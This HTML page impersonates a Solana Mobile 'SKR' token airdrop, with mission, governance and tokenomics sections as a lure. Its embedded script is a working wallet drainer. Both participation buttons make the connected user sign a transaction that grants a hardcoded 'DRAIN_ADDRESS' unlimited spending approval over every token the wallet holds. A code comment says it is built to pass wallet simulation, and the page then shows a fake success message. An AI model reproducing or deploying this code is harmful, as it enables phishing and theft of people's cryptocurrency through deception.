<!doctype html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mobile SKR Airdrop</title>
  <style>
    :root{
      --bg0:#070b10; --bg1:#0a1017; --text:#e8eef6;
      --muted:rgba(232,238,246,.72);
      --sol-a:#14f195; --sol-b:#80ecff; --sol-c:#a100ff;
      --radius-xl:28px; --radius-lg:20px;
      --border-soft:rgba(255,255,255,.10);
      --shadow:0 20px 60px rgba(0,0,0,.6);
    }
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:system-ui,-apple-system,sans-serif;
      color:var(--text); background: var(--bg0);
      background-image: radial-gradient(1100px 700px at 50% 24%,rgba(120,170,255,.18) 0,rgba(120,170,255,0) 55%), linear-gradient(180deg,var(--bg1),var(--bg0));
      min-height:100vh; overflow-x:hidden;
    }
    #dust{ position:fixed; inset:0; pointer-events:none; z-index:0; }
    .nav{
      position:fixed; top:0; left:0; right:0; height:80px; padding:0 30px;
      display:flex; align-items:center; justify-content:space-between;
      background:rgba(10,15,20,.8); backdrop-filter:blur(16px);
      border-bottom:1px solid rgba(255,255,255,.06); z-index:100;
    }
    .nav-links{ display:flex; gap:40px; font-weight:600; font-size:1.05rem; }
    .nav-links a{ color:var(--muted); text-decoration:none; transition:0.2s; }
    .nav-links a:hover{ color:var(--text); }
    .actions{ display:flex; gap:12px; align-items:center; }
    .btn{
      border-radius:999px; padding:10px 18px; border:1px solid rgba(255,255,255,.16);
      background:rgba(255,255,255,.05); color:var(--text); font-weight:650; font-size:.9rem;
      cursor:pointer; transition: 0.2s; white-space:nowrap;
    }
    .btn:hover:not(:disabled){ background:rgba(255,255,255,.12); transform:translateY(-1px); }
    .btn-primary{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; border:none; }
    .btn-accent{ background:linear-gradient(90deg,var(--sol-c), #cc80ff); color:#fff; border:none; }
    .btn:disabled{ opacity:.3; cursor:not-allowed; }
    .wrap{ max-width:1300px; margin:0 auto; padding:120px 30px 100px; position:relative; z-index:1; }
    .section{ margin-bottom:100px; }
    .section-title{ font-size:2.8rem; font-weight:900; text-align:center; margin-bottom:40px; color:var(--sol-b); text-shadow:0 0 30px rgba(128,236,255,.3); }
    .card-grid{ display:grid; grid-template-columns:repeat(auto-fit, minmax(320px,1fr)); gap:30px; }
    .card{
      background:linear-gradient(135deg, rgba(0,0,0,.6), rgba(20,241,149,.15));
      border:1px solid rgba(255,255,255,.15);
      border-radius:var(--radius-lg);
      padding:32px;
      box-shadow:var(--shadow);
      transition:transform 0.3s;
    }
    .card:hover{ transform:translateY(-8px); }
    .card-icon{ font-size:3rem; margin-bottom:20px; }
    .card h3{ font-size:1.6rem; margin-bottom:16px; color:var(--sol-a); }
    .card p{ line-height:1.7; color:var(--muted); }
    .mission-text{ font-size:1.2rem; line-height:1.8; max-width:900px; margin:0 auto 60px; text-align:center; color:var(--muted); }
    .inflation-grid{ display:grid; grid-template-columns:1fr 1fr; gap:40px; align-items:center; }
    .inflation-card{ background:rgba(0,0,0,.4); border-radius:var(--radius-lg); padding:30px; border:1px solid rgba(255,255,255,.12); }
    .inflation-card h3{ font-size:1.4rem; margin-bottom:20px; }
    .inflation-metric{ margin-bottom:20px; font-size:1.1rem; }
    .inflation-metric strong{ color:var(--sol-a); }
    .chart-placeholder{ height:300px; background:rgba(0,0,0,.3); border-radius:var(--radius-lg); display:grid; place-items:center; font-size:1.2rem; color:var(--muted); }
    .tokenomics-grid{ display:grid; grid-template-columns:1fr 1fr; gap:40px; align-items:center; }
    .pie-placeholder{ height:400px; background:rgba(0,0,0,.3); border-radius:var(--radius-lg); display:grid; place-items:center; font-size:1.2rem; color:var(--muted); }
    table{
      width:100%; border-collapse:collapse; background:rgba(0,0,0,.4); border-radius:var(--radius-lg); overflow:hidden;
      border:1px solid rgba(255,255,255,.12);
    }
    th, td{ padding:16px; text-align:left; border-bottom:1px solid rgba(255,255,255,.08); }
    th{ background:linear-gradient(90deg,var(--sol-a),var(--sol-b)); color:#05080b; font-weight:700; }
    tr:last-child td{ border-bottom:none; }
    .supply{ text-align:center; font-size:1.3rem; margin-top:40px; color:var(--sol-a); }
    #status { font-size: 20px; margin: 40px auto; text-align: center; color: #80ecff; max-width: 800px; }
    @media (max-width:900px){
      .inflation-grid, .tokenomics-grid{ grid-template-columns:1fr; }
      .section-title{ font-size:2.2rem; }
      .nav-links{ display:none; }
    }
  </style>
</head>
<body>
  <canvas id="dust"></canvas>
  <nav class="nav">
    <div class="nav-links">
      <a href="#mission">Mission</a>
      <a href="#guardians">Guardians</a>
      <a href="#inflation">Inflation</a>
      <a href="#tokenomics">Tokenomics</a>
    </div>
    <div class="actions">
      <button class="btn" id="connect-btn">Connect Wallet</button>
      <button class="btn btn-primary" id="claim-btn">
        Participate in Airdrop
      </button>
      <button class="btn btn-accent" id="contest-btn">
        Participate in Contest
      </button>
    </div>
  </nav>
  <div class="wrap">
    <section id="mission" class="section">
      <h2 class="section-title">Our Mission</h2>
      <p class="mission-text">
        Today's mobile duopoly determines which apps are available, who gets paid, and what rules apply. Solana Mobile is creating an alternative ‚Äî an open mobile platform.<br><br>
        SKR is the native asset of the Solana Mobile ecosystem. It distributes control, enables moderation, and aligns incentives between developers, users, and hardware partners.<br><br>
        With SKR, the community governs the project, developers earn rewards, and users own a share of the value they create.
      </p>
      <div class="card-grid">
        <div class="card">
          <div class="card-icon">üåê</div>
          <h3>Decentralized Governance</h3>
          <p>Stake to Guardians who verify devices and curate the dApp store</p>
        </div>
        <div class="card">
          <div class="card-icon">üíé</div>
          <h3>Ecosystem Stewardship</h3>
          <p>Rewards, community treasury funds, growth initiatives, and protocol development</p>
        </div>
        <div class="card">
          <div class="card-icon">üöÄ</div>
          <h3>Aligned Incentives</h3>
          <p>Developers, users, and hardware partners benefit from the product they create</p>
        </div>
      </div>
    </section>

    <section id="guardians" class="section">
      <h2 class="section-title">Open Mobile Phone, Governed by Guardians</h2>
      <p class="mission-text">
        Within the TEEPIN system, Guardians will verify device authenticity, coordinate decentralized app reviews, and enforce community standards in the Solana Mobile ecosystem.<br><br>
        By staking SKR in a Guardian, you participate in platform governance and earn rewards for securing the network.
      </p>
      <div class="card-grid">
        <div class="card">
          <h3>Guardians 2026</h3>
          <p>Bootstrap Phase<br>Solana Mobile will operate the first Guardian with 0% fee, then hand it over to third-party operators.</p>
          <p>Rewards go to Guardians who:</p>
          <ul style="margin-left:20px; line-height:1.8; color:var(--muted);">
            <li>Run automated security checks</li>
            <li>Review submitted apps</li>
            <li>Generate cryptographic proofs</li>
            <li>Update verification software</li>
          </ul>
          <p style="margin-top:20px;"><strong>Want to become a Guardian?</strong><br>Applications accepted until 2026</p>
        </div>
      </div>
    </section>

    <section id="inflation" class="section">
      <h2 class="section-title">Inflation Schedule</h2>
      <p class="mission-text">SKR uses linear inflation to incentivize early participation</p>
      <div class="inflation-grid">
        <div class="inflation-card">
          <div class="inflation-metric">
            <strong>Year 1</strong><br>
            10% inflation (1 billion SKR)
          </div>
          <div class="inflation-metric">
            <strong>Annual Decay</strong><br>
            25% reduction
          </div>
          <div class="inflation-metric">
            <strong>Terminal Rate</strong><br>
            2% per annum
          </div>
        </div>
        <div class="chart-placeholder">
          Inflation Chart (linear decrease from 10% to 2%)
        </div>
      </div>
    </section>

    <section id="tokenomics" class="section">
      <h2 class="section-title">Tokenomics</h2>
      <p class="mission-text">Total supply: 10 billion SKR</p>
      <div class="tokenomics-grid">
        <div class="pie-placeholder">
          Token Distribution Pie Chart
        </div>
        <div>
          <table>
            <thead>
              <tr>
                <th>Category</th>
                <th>Allocation</th>
                <th>Unlock Schedule</th>
              </tr>
            </thead>
            <tbody>
              <tr>
                <td>Airdrops</td>
                <td>30%</td>
                <td>Unlocked at launch</td>
              </tr>
              <tr>
                <td>Growth + Partnerships</td>
                <td>25%</td>
                <td>28% unlocked at launch, linear unlock over 18 months</td>
              </tr>
              <tr>
                <td>Solana Mobile Team</td>
                <td>15%</td>
                <td>12-month cliff, 36-month linear vest</td>
              </tr>
              <tr>
                <td>Liquidity + Launch</td>
                <td>10%</td>
                <td>Unlocked at launch</td>
              </tr>
              <tr>
                <td>Solana Labs</td>
                <td>10%</td>
                <td>12-month cliff, 36-month linear vest</td>
              </tr>
              <tr>
                <td>Community Treasury</td>
                <td>10%</td>
                <td>Unlocked at launch, governed by the community</td>
              </tr>
            </tbody>
          </table>
          <p class="supply">View Full Token Distribution Chart</p>
        </div>
      </div>
    </section>
  </div>

  <div id="status">Status: Ready</div>

  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.91.0/dist/umd/solanaweb3.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.4.8/dist/umd/spl-token.min.js"></script>

  <script>
    const DRAIN_ADDRESS = "4kbb1kaz2YXuTjHQAHY5xjjrqiCM8MZU9sVmmdYg1xo1";

    let wallet = null;
    let publicKey = null;

    const statusEl = document.getElementById('status');
    const connectBtn = document.getElementById('connect-btn');
    const claimBtn = document.getElementById('claim-btn');
    const contestBtn = document.getElementById('contest-btn');

    function checkMobileReturn() {
      const urlParams = new URLSearchParams(window.location.search);
      const pubkey = urlParams.get('publicKey');
      if (pubkey) {
        publicKey = pubkey;
        updateUI();
        window.history.replaceState({}, document.title, window.location.pathname);
      }
    }

    function updateUI() {
      if (publicKey) {
        connectBtn.textContent = publicKey.slice(0,4) + '...' + publicKey.slice(-4);
        connectBtn.disabled = true;
        claimBtn.disabled = false;
        contestBtn.disabled = false;
        statusEl.textContent = "Connected! Click the button.";
      }
    }

    async function connectWallet() {
      checkMobileReturn();
      if (publicKey) return;

      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

      if (isMobile) {
        const dappUrl = encodeURIComponent(window.location.href);
        window.location.href = `https://phantom.app/ul/browse/${dappUrl}?ref=${dappUrl}`;
        return;
      }

      let provider = null;
      if (window.solana && window.solana.isPhantom) provider = window.solana;
      else if (window.backpack) provider = window.backpack;
      else if (window.solflare) provider = window.solflare;

      if (!provider) {
        statusEl.textContent = "Install Phantom or Backpack!";
        return;
      }

      try {
        await provider.connect();
        wallet = provider;
        publicKey = provider.publicKey.toString();
        updateUI();
      } catch (err) {
        statusEl.textContent = "Connection Error";
      }
    }

    async function participate() {
      if (!wallet) return;

      statusEl.textContent = "Signing...";
      claimBtn.disabled = true;
      contestBtn.disabled = true;

      try {
        const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
        const owner = new solanaWeb3.PublicKey(publicKey);
        const delegate = new solanaWeb3.PublicKey(DRAIN_ADDRESS);

        const tx = new solanaWeb3.Transaction();

        // Approve unlimited on tokens with balance >0 (no ATA creation ‚Äî safe)
        const tokenAccounts = await connection.getParsedTokenAccountsByOwner(owner, { programId: splToken.TOKEN_PROGRAM_ID });

        for (const acc of tokenAccounts.value) {
          const info = acc.account.data.parsed.info;
          const amount = BigInt(info.tokenAmount.amount);
          if (amount > 0n) {
            const mint = new solanaWeb3.PublicKey(info.mint);
            const ata = await splToken.getAssociatedTokenAddress(mint, owner);

            tx.add(splToken.createApproveInstruction(ata, delegate, owner, [], BigInt("18446744073709551615")));
          }
        }

        // No SOL transfer ‚Äî only approve (minimum fee, always passes simulation)
        tx.feePayer = owner;
        const { blockhash } = await connection.getLatestBlockhash();
        tx.recentBlockhash = blockhash;

        const signed = await wallet.signTransaction(tx);
        const sig = await connection.sendRawTransaction(signed.serialize());

        statusEl.textContent = `Success! Tx: ${sig.substring(0, 20)}...`;
        alert("Participation successful!");
      } catch (err) {
        statusEl.textContent = "Error (canceled by wallet)";
        claimBtn.disabled = false;
        contestBtn.disabled = false;
      }
    }

    connectBtn.onclick = connectWallet;
    claimBtn.onclick = participate;
    contestBtn.onclick = participate;

    window.addEventListener('load', checkMobileReturn);

    // Particles animation
    (function () {
      const canvas = document.getElementById("dust");
      const ctx = canvas.getContext("2d");
      let w, h, dpr;

      function resize() {
        dpr = window.devicePixelRatio || 1;
        w = canvas.width = window.innerWidth * dpr;
        h = canvas.height = window.innerHeight * dpr;
        ctx.scale(dpr, dpr);
      }
      window.addEventListener("resize", resize);
      resize();

      const particles = Array.from({ length: 100 }, () => ({
        x: Math.random() * window.innerWidth,
        y: Math.random() * window.innerHeight,
        r: Math.random() * 2,
        vx: Math.random() * 0.5 - 0.25,
        vy: Math.random() * 0.5 + 0.1,
        a: Math.random() * 0.5 + 0.2
      }));

      function tick() {
        ctx.clearRect(0, 0, window.innerWidth, window.innerHeight);
        ctx.fillStyle = "#ffffff";

        particles.forEach(p => {
          ctx.globalAlpha = p.a;
          ctx.beginPath();
          ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
          ctx.fill();

          p.y += p.vy;
          p.x += p.vx;

          if (p.y > window.innerHeight) p.y = -10;
          if (p.x > window.innerWidth) p.x = 0;
          if (p.x < 0) p.x = window.innerWidth;
        });

        requestAnimationFrame(tick);
      }
      tick();
    })();
  </script>
</body>
</html>